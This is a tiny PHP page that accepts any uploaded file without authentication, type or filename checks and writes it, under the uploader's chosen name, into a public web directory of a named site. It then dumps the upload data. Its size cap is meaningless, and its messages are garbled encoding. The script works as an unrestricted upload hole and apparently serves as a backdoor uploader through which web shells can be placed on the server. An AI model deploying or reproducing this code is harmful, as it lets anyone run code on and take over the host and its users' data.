<html><body>
<?php
if($_FILES["filename"]["size"] > 1024*10000000000000*1024) {
echo ("���");
exit;}
if(is_uploaded_file($_FILES["filename"]["tmp_name"])) {
if(!move_uploaded_file($_FILES["filename"]["tmp_name"], "/home/coomb141/domains/lostcombats.com/public_html/backup/".$_FILES["filename"]["name"])){
echo "�����������";}
} else { echo("������"); }
?>
<?php 
echo "<pre>"; 
print_r($_FILES); 
echo "</pre>"; 
?>
</body></html>